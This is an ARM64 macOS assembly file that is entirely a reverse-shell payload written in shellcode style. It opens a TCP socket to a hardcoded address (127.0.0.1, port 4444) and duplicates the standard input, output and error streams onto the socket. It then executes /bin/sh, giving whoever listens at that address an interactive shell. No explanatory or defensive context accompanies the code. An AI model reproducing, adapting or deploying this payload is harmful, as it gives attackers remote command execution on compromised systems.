.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
    // s = socket(2, 1, 0)
    mov  x16, #97
    lsr  x1, x16, #6
    lsl  x0, x1, #1
    mov  x2, xzr
    svc  #0x1337

    // save s
    mvn  x3, x0

call_connect:
    // connect(s, &sockaddr, 16)
    mov  x1, #0x0210
    movk x1, #0x5C11, lsl #16
    movk x1, #0x007F, lsl #32
    movk x1, #0x0100, lsl #48
    str  x1, [sp, #-8]
    mov  x2, #8
    sub  x1, sp, x2
    mov  x2, #16
    mov  x16, #98
    svc  #0x1337

    lsr  x2, x2, #2

call_dup:
    // dup(s, 2) -> dup(s, 1) -> dup(s, 0)
    mvn  x0, x3
    lsr  x2, x2, #1
    mov  x1, x2
    mov  x16, #90
    svc  #0x1337
    mov  x10, xzr
    cmp  x10, x2
    bne  call_dup

call_execve:
    // execve("/bin/sh", 0, 0)
    mov  x1, #0x622F
    movk x1, #0x6E69, lsl #16
    movk x1, #0x732F, lsl #32
    movk x1, #0x68, lsl #48
    str  x1, [sp, #-8]
    mov	 x1, #8
    sub  x0, sp, x1
    mov  x1, xzr
    mov  x2, xzr
    mov  x16, #59
    svc  #0x1337
